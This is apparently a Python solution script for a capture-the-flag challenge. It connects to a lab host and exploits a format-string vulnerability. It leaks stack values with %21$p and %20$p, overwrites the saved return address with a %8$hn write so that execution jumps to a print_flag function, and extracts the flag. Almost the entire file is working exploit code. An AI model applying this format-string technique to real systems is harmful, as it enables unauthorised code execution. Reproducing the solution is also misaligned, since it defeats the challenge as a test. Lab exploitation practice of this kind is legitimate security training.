import sys, socket, time, re, struct, json
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
sys.path.insert(0, r"D:\ctf-index")
from cylab2 import CyLab

cy = CyLab(delay=1.2)
cy.login()
cy.req("PUT", "/api/challenges/485/instance/?source=library")
port = None
for _ in range(15):
    time.sleep(2)
    st, b = cy.req("GET", "/api/challenges/485/instance/")
    d = json.loads(b) if b.startswith("{") else {}
    if d.get("status") == "RUNNING":
        m = re.search(r"nc\s+([A-Za-z0-9.\-]+)\s+(\d+)", d.get("description") or "")
        if m:
            port = int(m.group(2))
        break
print("port:", port)
if not port:
    sys.exit(1)

s = socket.create_connection(("chatelaine.cylabacademy.net", port), timeout=15)
s.settimeout(8)
time.sleep(0.7)
try:
    s.recv(8192)
except Exception:
    pass


def ask(payload, wait=0.6):
    s.sendall(payload + b"\n")
    time.sleep(wait)
    out = b""
    try:
        out = s.recv(65536)
    except Exception:
        pass
    return out.decode("utf-8", "replace")


# 1. leak de l'adresse de retour vers main (position 21)
t = ask(b"%21$p")
print("leak21:", t[:200].replace("\n", " "))
m = re.search(r"0x[0-9a-f]+", t)
if not m:
    print("pas de leak21")
    sys.exit(1)
ret_main = int(m.group(0), 16)
print("ret_main:", hex(ret_main))

# 2. leak du rbp sauvegarde (position 20)
t2 = ask(b"%20$p")
print("leak20:", t2[:200].replace("\n", " "))
m2 = re.search(r"0x[0-9a-f]+", t2)
if not m2:
    print("pas de leak20")
    sys.exit(1)
saved_rbp = int(m2.group(0), 16)
print("saved_rbp:", hex(saved_rbp))

# 3. adresse de la valeur de retour sur la pile
ret_stack = saved_rbp - 8
print("ret_stack:", hex(ret_stack))
target = ret_main - 0x1AA
print("target (print_flag):", hex(target))

# 4. write 2 octets via %8$hn
low = target & 0xFFFF
payload = b"%" + str(low).encode() + b"x%8$hn"
payload += b"." * (16 - len(payload))
payload += struct.pack("<Q", ret_stack)
print("payload len:", len(payload), "low:", hex(low))
s.sendall(payload + b"\n")
time.sleep(1.0)
try:
    s.recv(65536)
except Exception:
    pass
# 5. exit -> declenche le retour
s.sendall(b"exit\n")
time.sleep(1.5)
out = b""
try:
    while True:
        chunk = s.recv(65536)
        if not chunk:
            break
        out += chunk
except Exception:
    pass
txt = out.decode("utf-8", "replace")
print("=== SORTIE ===")
print(txt[-800:])
mm = re.search(r"(?:academy|picoCTF)\{[^}]*\}", txt)
if mm:
    print("FLAG:", mm.group(0))
s.close()
